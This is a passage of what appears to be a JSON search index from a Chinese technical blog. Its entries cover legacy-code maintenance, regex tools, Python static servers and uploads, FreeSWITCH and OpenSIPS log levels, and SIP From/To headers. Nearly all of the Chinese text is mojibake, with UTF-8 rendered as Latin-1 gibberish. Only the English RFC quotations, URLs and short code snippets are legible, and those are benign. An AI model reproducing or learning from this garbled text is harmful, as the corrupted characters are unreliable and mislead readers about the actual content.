ã€‹\næ¯ä¸ªäººéƒ½æœ‰ä»é›¶å¼€å‘è½¯ä»¶çš„å¤„å¥³æƒ…ç»“ï¼Œä½†æ˜¯äº‹å®ä¸Šæˆ‘ä»¬å¤§å¤šæ•°æ—¶å€™éƒ½åœ¨ç»´æŠ¤åˆ«äººçš„ä»£ç ã€‚\næ‰€ä»¥ï¼Œåˆ«äººå†™çš„ä»£ç å¦‚ä½•ç³Ÿç³•ï¼Œä½ å†æŠ±æ€¨ä¹Ÿæ˜¯æ— æ„ä¹‰çš„ã€‚\nä»å†…å¿ƒä¸­é—®è‡ªå·±ï¼Œä½ ç©¶ç«Ÿæ˜¯åœ¨æŠ±æ€¨åˆ«äººï¼Œè¿˜æ˜¯ä¸æ•¢é¢å¯¹è‡ªå·±è„†å¼±çš„å†…å¿ƒã€‚\nè€ä»£ç çš„æ„ä¹‰ å»‰é¢‡è€çŸ£ï¼Œå°šèƒ½é¥­å¦ã€‚\nè€ä»£ç çš„æœ‰å¾ˆå¤šç¼ºç‚¹ï¼Œå¦‚éš¾ä»¥ç»´æŠ¤ï¼Œé€»è¾‘æ··ä¹±ã€‚ä½†æ˜¯è€ä»£ç æœ‰å”¯ä¸€çš„å¥½å¤„ï¼Œå°±æ˜¯è€ä»£ç ç»è¿‡ç”Ÿäº§ç¯å¢ƒçš„æ´—ç¤¼ã€‚è¿™è‡³å°‘èƒ½è¯æ˜è€ä»£ç èƒ½å¤Ÿç¨³å®šè¿è¡Œï¼Œä¸å‡ºé—®é¢˜ã€‚\nä¸œè¥¿ï¼Œå¦‚æœä¸å‡ºé—®é¢˜ï¼Œå°±ä¸è¦åŠ¨å®ƒã€‚\nè€ä»£ç å¯èƒ½å­˜åœ¨å“ªäº›é—®é¢˜ è€ä»£ç çš„é—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬é‡æ„çš„ç‚¹ã€‚é¦–å…ˆæˆ‘ä»¬è¦æ˜ç¡®ï¼Œè€ä»£ç ä¸­æœ‰å“ªäº›é—®é¢˜ã€‚\næ¨¡å—æ€§ä¸å¼ºï¼Œé‡å¤ä»£ç å¤ªå¤š é€»è¾‘æ··ä¹±ï¼Œä¸šåŠ¡é€»è¾‘å’Œæ¡†æ¶é€»è¾‘æ··æ‚ æ³¨é‡Šæ··ä¹±ï¼šç‰¹åˆ«è¦å°å¿ƒï¼Œå¾ˆå¤šè€ä»£ç ä¸­çš„æ³¨é‡Šéƒ½å¯èƒ½ä¸çŸ¥é“ç¥–ä¼ å¤šå°‘ä»£äº†ã€‚å¦‚æœä½ è¦æŒ‰ç€æ³¨é‡Šå»ç†è§£ï¼Œå¾ˆå¯èƒ½å—è¾•åŒ—è¾™ï¼Œèµ°ç«å…¥é­”ã€‚æŒ‰ç…§ä»£ç çš„æ‰§è¡Œå»ç†è§£ä¸šåŠ¡é€»è¾‘ï¼Œè€Œä¸æ˜¯æŒ‰ç…§æ³¨é‡Šã€‚ é…ç½®æ€§çš„ç¡¬ä»£ç å’Œä¸šåŠ¡é€»è¾‘æ··æ‚ï¼Œè¿™ä¸ªæ˜¯éœ€è¦åœ¨åæœŸæŠ½ç¦»çš„ å¦‚æœä½ æ— æ³•ç†è§£ï¼Œè¯·å‹¿é‡æ„ å¸¦ç€respect, ä¹Ÿå¸¦ç€è´¨ç–‘ï¼Œé˜…è¯»å¹¶ç†è§£è€ä»£ç ã€‚å–å…¶ç²¾åï¼Œå»å…¶ç³Ÿç²•ã€‚å¦‚æœä½ è¿˜ä¸ç†è§£è€ä»£ç ï¼Œå°±åˆ«æ€¥ç€é‡æ„å®ƒï¼Œè®©å­å¼¹é£ä¸€ä¼šã€‚\nç­‰è‡ªå·±èƒ½å¤Ÿç†è§£è€ä»£ç æ—¶ï¼Œå†å»é‡æ„ã€‚æˆ‘ç›¸ä¿¡åœ¨ç†è§£åŸºç¡€ä¸Šé‡æ„ï¼Œä¼šæ›´å¿«ï¼Œä¹Ÿæ›´å®‰å…¨ã€‚\nä¸è¦å¤§æ®µæ”¹å†™ï¼Œè¦è§ç¼æ’é’ˆ ä¸è¦åœ¨è€ä»£ç ä¸­ç›´æ¥å†™è‡ªå·±çš„ä»£ç ï¼Œåº”è¯¥ä½¿ç”¨å‡½æ•°ã€‚\nåœ¨è€ä»£ç ä¸­æ”¹åŠ¨ä¸€è¡Œï¼Œè°ƒç”¨è‡ªå·±å†™çš„å‡½æ•°ã€‚\nå‡ ä¹æ¯ç§è¯­è¨€ä¸­éƒ½æœ‰å‡½æ•°è¿™ç§ç»„ç»‡ä»£ç çš„å½¢å¼ï¼Œé€šè¿‡è§ç¼æ’é’ˆè°ƒç”¨å‡½æ•°çš„æ–¹å¼ã€‚èƒ½å¤Ÿå°½é‡å‡å°‘è€ä»£ç çš„æ”¹åŠ¨ï¼Œå¦‚æœå‡ºç°é—®é¢˜ï¼Œä¹Ÿæ¯”è¾ƒå®¹æ˜“è°ƒè¯•ã€‚\n","permalink":"https://wdd.js.org/posts/2019/07/osb460/","summary":"Photo byÂ Blair FraserÂ onÂ Unsplash\nä»å¤´å¼€å‘ä¸€ä¸ªè½¯ä»¶åªæ˜¯å°å„¿ç§‘ï¼Œæ”¹è¿›ä¸€ä¸ªç¨‹åºæ‰æ˜¾çœŸæœ¬äº‹ã€‚ã€Šè‹¥ä¸ºè‡ªç”±æ•…Â è‡ªç”±è½¯ä»¶ä¹‹çˆ¶ç†æŸ¥å¾·Â·æ–¯æ‰˜æ›¼ä¼ ã€‹\næ¯ä¸ªäººéƒ½æœ‰ä»é›¶å¼€å‘è½¯ä»¶çš„å¤„å¥³æƒ…ç»“ï¼Œä½†æ˜¯äº‹å®ä¸Šæˆ‘ä»¬å¤§å¤šæ•°æ—¶å€™éƒ½åœ¨ç»´æŠ¤åˆ«äººçš„ä»£ç ã€‚\næ‰€ä»¥ï¼Œåˆ«äººå†™çš„ä»£ç å¦‚ä½•ç³Ÿç³•ï¼Œä½ å†æŠ±æ€¨ä¹Ÿæ˜¯æ— æ„ä¹‰çš„ã€‚\nä»å†…å¿ƒä¸­é—®è‡ªå·±ï¼Œä½ ç©¶ç«Ÿæ˜¯åœ¨æŠ±æ€¨åˆ«äººï¼Œè¿˜æ˜¯ä¸æ•¢é¢å¯¹è‡ªå·±è„†å¼±çš„å†…å¿ƒã€‚\nè€ä»£ç çš„æ„ä¹‰ å»‰é¢‡è€çŸ£ï¼Œå°šèƒ½é¥­å¦ã€‚\nè€ä»£ç çš„æœ‰å¾ˆå¤šç¼ºç‚¹ï¼Œå¦‚éš¾ä»¥ç»´æŠ¤ï¼Œé€»è¾‘æ··ä¹±ã€‚ä½†æ˜¯è€ä»£ç æœ‰å”¯ä¸€çš„å¥½å¤„ï¼Œå°±æ˜¯è€ä»£ç ç»è¿‡ç”Ÿäº§ç¯å¢ƒçš„æ´—ç¤¼ã€‚è¿™è‡³å°‘èƒ½è¯æ˜è€ä»£ç èƒ½å¤Ÿç¨³å®šè¿è¡Œï¼Œä¸å‡ºé—®é¢˜ã€‚\nä¸œè¥¿ï¼Œå¦‚æœä¸å‡ºé—®é¢˜ï¼Œå°±ä¸è¦åŠ¨å®ƒã€‚\nè€ä»£ç å¯èƒ½å­˜åœ¨å“ªäº›é—®é¢˜ è€ä»£ç çš„é—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬é‡æ„çš„ç‚¹ã€‚é¦–å…ˆæˆ‘ä»¬è¦æ˜ç¡®ï¼Œè€ä»£ç ä¸­æœ‰å“ªäº›é—®é¢˜ã€‚\næ¨¡å—æ€§ä¸å¼ºï¼Œé‡å¤ä»£ç å¤ªå¤š é€»è¾‘æ··ä¹±ï¼Œä¸šåŠ¡é€»è¾‘å’Œæ¡†æ¶é€»è¾‘æ··æ‚ æ³¨é‡Šæ··ä¹±ï¼šç‰¹åˆ«è¦å°å¿ƒï¼Œå¾ˆå¤šè€ä»£ç ä¸­çš„æ³¨é‡Šéƒ½å¯èƒ½ä¸çŸ¥é“ç¥–ä¼ å¤šå°‘ä»£äº†ã€‚å¦‚æœä½ è¦æŒ‰ç€æ³¨é‡Šå»ç†è§£ï¼Œå¾ˆå¯èƒ½å—è¾•åŒ—è¾™ï¼Œèµ°ç«å…¥é­”ã€‚æŒ‰ç…§ä»£ç çš„æ‰§è¡Œå»ç†è§£ä¸šåŠ¡é€»è¾‘ï¼Œè€Œä¸æ˜¯æŒ‰ç…§æ³¨é‡Šã€‚ é…ç½®æ€§çš„ç¡¬ä»£ç å’Œä¸šåŠ¡é€»è¾‘æ··æ‚ï¼Œè¿™ä¸ªæ˜¯éœ€è¦åœ¨åæœŸæŠ½ç¦»çš„ å¦‚æœä½ æ— æ³•ç†è§£ï¼Œè¯·å‹¿é‡æ„ å¸¦ç€respect, ä¹Ÿå¸¦ç€è´¨ç–‘ï¼Œé˜…è¯»å¹¶ç†è§£è€ä»£ç ã€‚å–å…¶ç²¾åï¼Œå»å…¶ç³Ÿç²•ã€‚å¦‚æœä½ è¿˜ä¸ç†è§£è€ä»£ç ï¼Œå°±åˆ«æ€¥ç€é‡æ„å®ƒï¼Œè®©å­å¼¹é£ä¸€ä¼šã€‚\nç­‰è‡ªå·±èƒ½å¤Ÿç†è§£è€ä»£ç æ—¶ï¼Œå†å»é‡æ„ã€‚æˆ‘ç›¸ä¿¡åœ¨ç†è§£åŸºç¡€ä¸Šé‡æ„ï¼Œä¼šæ›´å¿«ï¼Œä¹Ÿæ›´å®‰å…¨ã€‚\nä¸è¦å¤§æ®µæ”¹å†™ï¼Œè¦è§ç¼æ’é’ˆ ä¸è¦åœ¨è€ä»£ç ä¸­ç›´æ¥å†™è‡ªå·±çš„ä»£ç ï¼Œåº”è¯¥ä½¿ç”¨å‡½æ•°ã€‚\nåœ¨è€ä»£ç ä¸­æ”¹åŠ¨ä¸€è¡Œï¼Œè°ƒç”¨è‡ªå·±å†™çš„å‡½æ•°ã€‚\nå‡ ä¹æ¯ç§è¯­è¨€ä¸­éƒ½æœ‰å‡½æ•°è¿™ç§ç»„ç»‡ä»£ç çš„å½¢å¼ï¼Œé€šè¿‡è§ç¼æ’é’ˆè°ƒç”¨å‡½æ•°çš„æ–¹å¼ã€‚èƒ½å¤Ÿå°½é‡å‡å°‘è€ä»£ç çš„æ”¹åŠ¨ï¼Œå¦‚æœå‡ºç°é—®é¢˜ï¼Œä¹Ÿæ¯”è¾ƒå®¹æ˜“è°ƒè¯•ã€‚","title":"å¦‚ä½•ç»´æŠ¤è€ä»£ç ?"},{"content":"regex101: åŠŸèƒ½æœ€å¼º https://regex101.com/\nregex101çš„åŠŸèƒ½æœ€å¼ºï¼Œæ”¯æŒphp, js, python, å’Œgoçš„æ­£åˆ™è¡¨è¾¾å¼\nRegulexï¼šæ­£åˆ™å¯è§†åŒ– https://jex.im/regulex/#!flags=\u0026amp;re=%5E(a%7Cb)*%3F%24\nregulexä»…æ”¯æŒjsçš„æ­£åˆ™ï¼Œ\nregexperï¼šæ­£åˆ™å¯è§†åŒ– https://regexper.com/\npyregexï¼šä¸“æ³¨pythonæ­£åˆ™ http://www.pyregex.com/\n","permalink":"https://wdd.js.org/fe/regex-tools/","summary":"regex101: åŠŸèƒ½æœ€å¼º https://regex101.com/\nregex101çš„åŠŸèƒ½æœ€å¼ºï¼Œæ”¯æŒphp, js, python, å’Œgoçš„æ­£åˆ™è¡¨è¾¾å¼\nRegulexï¼šæ­£åˆ™å¯è§†åŒ– https://jex.im/regulex/#!flags=\u0026amp;re=%5E(a%7Cb)*%3F%24\nregulexä»…æ”¯æŒjsçš„æ­£åˆ™ï¼Œ\nregexperï¼šæ­£åˆ™å¯è§†åŒ– https://regexper.com/\npyregexï¼šä¸“æ³¨pythonæ­£åˆ™ http://www.pyregex.com/","title":"Regex Tools"},{"content":"åŸºäºpython # åŸºäºpython2 python -m SimpleHTTPServer 8088 # åŸºäºpython3 python -m http.server 8088 åŸºäºNode.js https://github.com/zeit/serve https://github.com/http-party/http-server ","permalink":"https://wdd.js.org/posts/2019/07/stxzl6/","summary":"åŸºäºpython # åŸºäºpython2 python -m SimpleHTTPServer 8088 # åŸºäºpython3 python -m http.server 8088 åŸºäºNode.js https://github.com/zeit/serve https://github.com/http-party/http-server ","title":"1ç§’æ­å»ºé™æ€æ–‡ä»¶æœåŠ¡å™¨"},{"content":"ä¸Šä¼ æ–‡ä»¶ import requests headers = { \u0026#34;ssid\u0026#34;:\u0026#34;1234\u0026#34; } files = {\u0026#39;file\u0026#39;: open(\u0026#39;yourfile.tar.gz\u0026#39;, \u0026#39;rb\u0026#39;)} url=\u0026#34;http://localhost:1345/fileUpload/\u0026#34; r = requests.post(url, files=files, headers=headers) print(r.status_code) ","permalink":"https://wdd.js.org/posts/2019/07/ya30bi/","summary":"ä¸Šä¼ æ–‡ä»¶ import requests headers = { \u0026#34;ssid\u0026#34;:\u0026#34;1234\u0026#34; } files = {\u0026#39;file\u0026#39;: open(\u0026#39;yourfile.tar.gz\u0026#39;, \u0026#39;rb\u0026#39;)} url=\u0026#34;http://localhost:1345/fileUpload/\u0026#34; r = requests.post(url, files=files, headers=headers) print(r.status_code) ","title":"python request åº“å­¦ä¹ "},{"content":"fsæ—¥å¿—çº§åˆ«\n0 \u0026#34;CONSOLE\u0026#34;, 1 \u0026#34;ALERT\u0026#34;, 2 \u0026#34;CRIT\u0026#34;, 3 \u0026#34;ERR\u0026#34;, 4 \u0026#34;WARNING\u0026#34;, 5 \u0026#34;NOTICE\u0026#34;, 6 \u0026#34;INFO\u0026#34;, 7 \u0026#34;DEBUG\u0026#34; æ—¥å¿—çº§åˆ«è®¾ç½®çš„è¶Šé«˜ï¼Œæ˜¾ç¤ºçš„æ—¥å¿—è¶Šå¤š\nåœ¨autoload_configs/switch.conf.xml è®¾ç½®äº†ä¸€äº›å¿«æ·é”®ï¼Œå¯ä»¥åœ¨fs_cliä¸­ä½¿ç”¨\nF7å°†æ—¥å¿—çº§åˆ«è®¾ç½®ä¸º0ï¼Œæ˜¾ç¤ºçš„æ—¥å¿—æœ€å°‘ F8å°†æ—¥å¿—çº§åˆ«è®¾ç½®ä¸º7ï¼Œ æ˜¾ç¤ºæ—¥å¿—æœ€å¤š åŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨ console loglevelæŒ‡ä»¤è‡ªå®šä¹‰è®¾ç½®çº§åˆ«\nconsole loglevel 1 console loglevel notice å‚è€ƒ https://freeswitch.org/confluence/display/FREESWITCH/Troubleshooting+Debugging ","permalink":"https://wdd.js.org/freeswitch/fs-log-level/","summary":"fsæ—¥å¿—çº§åˆ«\n0 \u0026#34;CONSOLE\u0026#34;, 1 \u0026#34;ALERT\u0026#34;, 2 \u0026#34;CRIT\u0026#34;, 3 \u0026#34;ERR\u0026#34;, 4 \u0026#34;WARNING\u0026#34;, 5 \u0026#34;NOTICE\u0026#34;, 6 \u0026#34;INFO\u0026#34;, 7 \u0026#34;DEBUG\u0026#34; æ—¥å¿—çº§åˆ«è®¾ç½®çš„è¶Šé«˜ï¼Œæ˜¾ç¤ºçš„æ—¥å¿—è¶Šå¤š\nåœ¨autoload_configs/switch.conf.xml è®¾ç½®äº†ä¸€äº›å¿«æ·é”®ï¼Œå¯ä»¥åœ¨fs_cliä¸­ä½¿ç”¨\nF7å°†æ—¥å¿—çº§åˆ«è®¾ç½®ä¸º0ï¼Œæ˜¾ç¤ºçš„æ—¥å¿—æœ€å°‘ F8å°†æ—¥å¿—çº§åˆ«è®¾ç½®ä¸º7ï¼Œ æ˜¾ç¤ºæ—¥å¿—æœ€å¤š åŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨ console loglevelæŒ‡ä»¤è‡ªå®šä¹‰è®¾ç½®çº§åˆ«\nconsole loglevel 1 console loglevel notice å‚è€ƒ https://freeswitch.org/confluence/display/FREESWITCH/Troubleshooting+Debugging ","title":"fsæ—¥å¿—çº§åˆ«"},{"content":" fromå­—æ®µç”¨æ¥æ ‡è®°è¯·æ±‚çš„å‘èµ·è€…ID toå­—æ®µç”¨æ¥æ ‡è®°è¯·æ±‚æ¥å—è€…çš„ID toå­—æ®µå¹¶ä¸èƒ½ç”¨äºè·¯ç”±ï¼Œrequest-urlå¯ä»¥ç”¨æ¥è·¯ç”± ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œsipæ¶ˆæ¯å†ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œfromå’Œtoå­—æ®µéƒ½ä¸ä¼šæ”¹ï¼Œè€Œrequest-urlå¾ˆå¯èƒ½ä¼šå› ä¸ºè·¯ç”±è€Œæ”¹å˜ å¯¹äºæœ€åˆçš„è¯·æ±‚ï¼Œé™¤äº†æ³¨å†Œè¯·æ±‚ä¹‹å¤–ï¼Œrequest-urlå’Œtoå­—æ®µä¸­çš„urlä¸€è‡´ fromå­—æ®µï¼šThe From header field is a required header field that indicates the originator of the request. It is one of two addresses used to identify the dialog. The FromÂ header field contains a URI, but it may not contain the transport, maddr, or ttl URI parameters. A From header field may contain a tag used to identify a particular call. A From header field may contain a display name, in which case the URI is enclosed in \u0026lt; \u0026gt;. If there is both a URI parameter and a tag, then the URI including any parameters must be enclosed in \u0026lt; \u0026gt;. Examples are shown in Table 6.8. A From tag was optional in RFC 2543 but is mandatory to include in RFC 3261.\ntoå­—æ®µï¼š**The To header field is a required header field in every SIP message used to indicate the recipient of the request. Any responses generated by a UA will contain this header field with the addition of a tag. (Note that an RFC 2543 client will typically only generate a tag if more than one Via header field is present in the request.) Any response generated by a proxy must have a tag added to the To header field. A tag added to the header field in a 200 OK response is used through- out the call and incorporated into the dialog. The To header field URI is never used for routingâ€”the Request-URI is used for this purpose. An optional display name can be present in the header field, in which case the SIP URI is enclosed in \u0026lt; \u0026gt;. If the URI contains any parameters or username parameters, the URI must be enclosed in \u0026lt; \u0026gt; even if no display name is present. The compact form of the header field is t. Examples are shown in Table 6.12.\nä¸Šé¢çš„ä¿¡ä»¤å›¾å±äºä¸€ä¸ªdialog, å¹¶ä¸”åŒ…å«ä¸‰ä¸ªäº‹åŠ¡\ninvite åˆ° 200 okå±äºä¸€ä¸ªäº‹åŠ¡ ackæ˜¯å•ç‹¬çš„ä¸€ä¸ªäº‹åŠ¡ byeå’Œ200 okå±äºä¸€ä¸ªäº‹åŠ¡ åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­ï¼Œfromå’Œtoä¸­çš„sip urlå’Œtagéƒ½æ˜¯ç›¸åŒçš„ï¼Œä½†æ˜¯å¯¹äºä¸åŒçš„äº‹åŠ¡ï¼Œfromå’Œtoå¤´çš„urlå’Œtagä¼šç›¸åã€‚\n# äº‹åŠ¡1: INVITE 180 200 From: \u0026lt;sip:a@test.com\u0026gt;;tag=aaa To: \u0026lt;sip:b@test.com\u0026gt;;tag=bbb # äº‹åŠ¡2: ACK From: \u0026lt;sip:a@test.com\u0026gt;;tag=aaa To: \u0026lt;sip:b@test.com\u0026gt;;tag=bbb # äº‹åŠ¡3: BYE 200 ok # ç”±äºäº‹åŠ¡3çš„å‘èµ·æ–¹æ˜¯B, æ‰€ä»¥ From: \u0026lt;sip:b@test.com\u0026gt;;tag=bbb To: \u0026lt;sip:a@test.com\u0026gt;;tag=aaa æ‰€ä»¥åœ¨å¤„ç†OpenSIPSè„šæœ¬çš„æ—¶å€™ï¼Œç‰¹åˆ«æ˜¯å…³äºfrom_tagå’Œto_tagçš„å¤„ç†çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸èƒ½å…ˆå…¥ä¸ºä¸»çš„è®¤ä¸ºåˆå§‹åŒ–å’Œåºåˆ—åŒ–çš„çš„æ‰€æœ‰è¯·æ±‚é‡Œfrom_tagå’Œto_tagéƒ½æ˜¯ä¸å˜çš„ã€‚ ä¹Ÿä¸èƒ½å…ˆå…¥ä¸ºä¸»çš„è®¤ä¸ºfrom_urlå’Œ to_urlæ˜¯ä¸€æˆä¸å˜çš„ã€‚\næ‰€ä»¥æˆ‘ä»¬å°±å¿…é¡»æ·±å…¥çš„è®¤è¯†åˆ°ï¼Œfromå’Œtoå®é™…ä¸Šæ˜¯æ ‡å¿—ç€è¿™ä¸ªäº‹åŠ¡çš„æ–¹å‘ã€‚è€Œä¸æ˜¯dialogçš„æ–¹å‘ã€‚\nã€é‡ç‚¹ã€‘åˆå§‹åŒ–è¯·æ±‚å’Œåºåˆ—åŒ–è¯·æ±‚\nrfc 3261 request url The initial Request-URI of the message SHOULD be set to the value ofÂ the URI in the To field. One notable exception is the REGISTERÂ method; behavior for setting the Request-URI of REGISTER is given inÂ Section 10. It may also be undesirable for privacy reasons orÂ convenience to set these fields to the same value (especially if theÂ originating UA expects that the Request-URI will be changed duringÂ transit).Â In some special circumstances, the presence of a pre-existing routeÂ set can affect the Request-URI of the message. A pre-existing routeÂ set is an ordered set of URIs that identify a chain of servers, toÂ which a UAC will send outgoing requests that are outside of a dialog.Â Commonly, they are configured on the UA by a user or service providerÂ manually, or through some other non-SIP mechanism. When a providerÂ wishes to configure a UA with an outbound proxy, it is RECOMMENDEDÂ that this be done by providing it with a pre-existing route set withÂ a single URI, that of the outbound proxy.Â When a pre-existing route set is present, the procedures forÂ populating the Request-URI and Route header field detailed in SectionÂ 12.2.1.1 MUST be followed (even though there is no dialog), using theÂ desired Request-URI as the remote target URI.\n","permalink":"https://wdd.js.org/opensips/ch1/from-to-request-url/","summary":"fromå­—æ®µç”¨æ¥æ ‡è®°è¯·æ±‚çš„å‘èµ·è€…ID toå­—æ®µç”¨æ¥æ ‡è®°è¯·æ±‚æ¥å—è€…çš„ID toå­—æ®µå¹¶ä¸èƒ½ç”¨äºè·¯ç”±ï¼Œrequest-urlå¯ä»¥ç”¨æ¥è·¯ç”± ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œsipæ¶ˆæ¯å†ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œfromå’Œtoå­—æ®µéƒ½ä¸ä¼šæ”¹ï¼Œè€Œrequest-urlå¾ˆå¯èƒ½ä¼šå› ä¸ºè·¯ç”±è€Œæ”¹å˜ å¯¹äºæœ€åˆçš„è¯·æ±‚ï¼Œé™¤äº†æ³¨å†Œè¯·æ±‚ä¹‹å¤–ï¼Œrequest-urlå’Œtoå­—æ®µä¸­çš„urlä¸€è‡´ fromå­—æ®µï¼šThe From header field is a required header field that indicates the originator of the request. It is one of two addresses used to identify the dialog. The FromÂ header field contains a URI, but it may not contain the transport, maddr, or ttl URI parameters. A From header field may contain a tag used to identify a particular call. A From header field may contain a display name, in which case the URI is enclosed in \u0026lt; \u0026gt;.","title":"from vs to vs request-urlä¹‹é—´çš„å…³ç³»"},{"content":"å»ºè®®æ—¥å¿—æ ¼å¼ xlog(\u0026#34;$rm $fu-\u0026gt;$tu:$cfg_line some msg\u0026#34;) æ—¥å¿—çº§åˆ« L_ALERT (-3) L_CRIT (-2) L_ERR (-1) - this is used by default if log_level is omitted L_WARN (1) L_NOTICE (2) L_INFO (3) L_DBG (4) æ—¥å¿—çº§åˆ«å¦‚æœè®¾ç½®ä¸º2ï¼Œ é‚£ä¹ˆåªä¼šæ‰“å°å°äºç­‰äº2çš„æ—¥å¿—ã€‚é»˜è®¤ä½¿ç”¨xlog(\u0026ldquo;hello\u0026rdquo;), é‚£ä¹ˆæ—¥å¿—çº§åˆ«å°±ä¼šæ˜¯L_ERR\nç”Ÿäº§ç¯å¢ƒå»ºè®®å°†æ—¥å¿—ç•Œåˆ«è°ƒæ•´åˆ°-1\n1.xçš„opensipsä½¿ç”¨ debug=3 è®¾ç½®æ—¥å¿—çº§åˆ«2.xçš„opensipsä½¿ç”¨Â log_level=3 è®¾ç½®æ—¥å¿—çº§åˆ«\nåŠ¨æ€è®¾ç½®æ—¥å¿—çº§åˆ« åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå¯ä»¥é€šè¿‡opensipctl å‘½ä»¤åŠ¨æ€è®¾ç½®æ—¥å¿—çº§åˆ«\nopensipsctl fifo log_level -2 æœ€å¥½ä½¿ç”¨æ—¥å¿—çº§åˆ« ä¸è¦ä¸ºäº†ç®€ä¾¿ï¼Œéƒ½ç”¨ xlog(\u0026#34;msg\u0026#34;) å¦‚æœmsgæ˜¯ä¿¡æ¯çº§åˆ«ï¼Œç”¨xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;msg\u0026#34;) å¦‚æœmsgæ˜¯é”™è¯¯ä¿¡æ¯ï¼Œåˆ™ä½¿ç”¨xlog(\u0026#34;msg\u0026#34;) ","permalink":"https://wdd.js.org/opensips/ch5/xlog-level/","summary":"å»ºè®®æ—¥å¿—æ ¼å¼ xlog(\u0026#34;$rm $fu-\u0026gt;$tu:$cfg_line some msg\u0026#34;) æ—¥å¿—çº§åˆ« L_ALERT (-3) L_CRIT (-2) L_ERR (-1) - this is used by default if log_level is omitted L_WARN (1) L_NOTICE (2) L_INFO (3) L_DBG (4) æ—¥å¿—çº§åˆ«å¦‚æœè®¾ç½®ä¸º2ï¼Œ é‚£ä¹ˆåªä¼šæ‰“å°å°äºç­‰äº2çš„æ—¥å¿—ã€‚é»˜è®¤ä½¿ç”¨xlog(\u0026ldquo;hello\u0026rdquo;), é‚£ä¹ˆæ—¥å¿—çº§åˆ«å°±ä¼šæ˜¯L_ERR\nç”Ÿäº§ç¯å¢ƒå»ºè®®å°†æ—¥å¿—ç•Œåˆ«è°ƒæ•´åˆ°-1\n1.xçš„opensipsä½¿ç”¨ debug=3 è®¾ç½®æ—¥å¿—çº§åˆ«2.xçš„opensipsä½¿ç”¨Â log_level=3 è®¾ç½®æ—¥å¿—çº§åˆ«\nåŠ¨æ€è®¾ç½®æ—¥å¿—çº§åˆ« åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå¯ä»¥é€šè¿‡opensipctl å‘½ä»¤åŠ¨æ€è®¾ç½®æ—¥å¿—çº§åˆ«\nopensipsctl fifo log_level -2 æœ€å¥½ä½¿ç”¨æ—¥å¿—çº§åˆ« ä¸è¦ä¸ºäº†ç®€ä¾¿ï¼Œéƒ½ç”¨ xlog(\u0026#34;msg\u0026#34;) å¦‚æœmsgæ˜¯ä¿¡æ¯çº§åˆ«ï¼Œç”¨xlog(\u0026#34;L_INFO\u0026#34;, \u0026#34;msg\u0026#34;) å¦‚æœmsgæ˜¯é”™è¯¯ä¿¡æ¯ï¼Œåˆ™ä½¿ç”¨xlog(\u0026#34;msg\u0026#34;) ","title":"æ—¥å¿—xlog"},{"content":" å˜é‡ä¸è¦ä½¿ç”¨ç¼©å†™ï¼Œè¦è§åçŸ¥æ„ã€‚ç°ä»£åŒ–çš„IDEéƒ½æä¾›è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼Œå³ä½¿æ˜¯VIM, ä¹Ÿå¯ä»¥ç”¨ctrl+nï¼Œ ctrl+p, ctrl+y, ctrl+eå»è‡ªåŠ¨è¡¥å…¨ã€‚ å˜é‡åç¼©å†™çœŸæ˜¯ç¾éš¾ã€‚ ","permalink":"https://wdd.js.org/posts/2019/07/pxdvcx/","summary":" å˜é‡ä¸è¦ä½¿ç”¨ç¼©å†™ï¼Œè¦è§åçŸ¥æ„ã€‚ç°ä»£åŒ–çš„IDEéƒ½æä¾›è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼Œå³ä½¿æ˜¯VIM, ä¹Ÿå¯ä»¥ç”¨ctrl+nï¼Œ ctrl+p, ctrl+y, ctrl+eå»è‡ªåŠ¨è¡¥å…¨ã€‚ å˜é‡åç¼©å†™çœŸæ˜¯ç¾éš¾ã€‚ ","title":"ç¼–ç è§„åˆ™"},{"content":"å›¾ç‰‡æ¥è‡ªÂ https://microchipdeveloper.com/Â åªä¸è¿‡è¿™ä¸ªç½‘ç«™è®¿é—®é€Ÿåº¦å¾ˆæ…¢ï¼Œä½†æ˜¯é‡Œé¢çš„å›¾ç‰‡éå¸¸æœ‰æ„æ€ï¼Œèƒ½å¤Ÿç®€æ´æ˜äº†çš„è¯´æ˜ä¸€ä¸ªæ¦‚å¿µã€‚\nä¸Šå­¦çš„æ—¶å€™ï¼Œæ•°å­¦è€å¸ˆå–œæ¬¢åœ¨è®²è¯¾å‰å…ˆè®²ä¸€äº›æ¦‚å¿µï¼Œç„¶åå†åšé¢˜ã€‚ä½†æ˜¯æˆ‘è§‰å¾—æ¦‚å¿µå¹¶æ²¡æœ‰é‚£ä¹ˆé‡è¦ï¼Œæˆ‘æ›´å–œæ¬¢åšé¢˜ã€‚\nä½†æ˜¯ï¼Œå½“ä½ ç†è§£äº†æ¦‚å¿µåï¼Œå†å»å®æˆ˜ï¼Œå°±æœ‰äº‹åŠåŠŸå€çš„æ•ˆæœã€‚\n1. è·¯ç”±å™¨ è·¯ç”±å™¨ï¼ˆè‹±è¯­ï¼šRouterï¼Œåˆç§°è·¯å¾„å™¨ï¼‰æ˜¯ä¸€ç§ç”µè®¯ç½‘ç»œè®¾å¤‡ï¼Œæä¾›è·¯ç”±ä¸è½¬é€ä¸¤ç§é‡è¦æœºåˆ¶ï¼Œå¯ä»¥å†³å®šæ•°æ®åŒ…ä»æ¥æºç«¯åˆ°ç›®çš„ç«¯æ‰€ç»è¿‡çš„è·¯ç”±è·¯å¾„ï¼ˆhoståˆ°hostä¹‹é—´çš„ä¼ 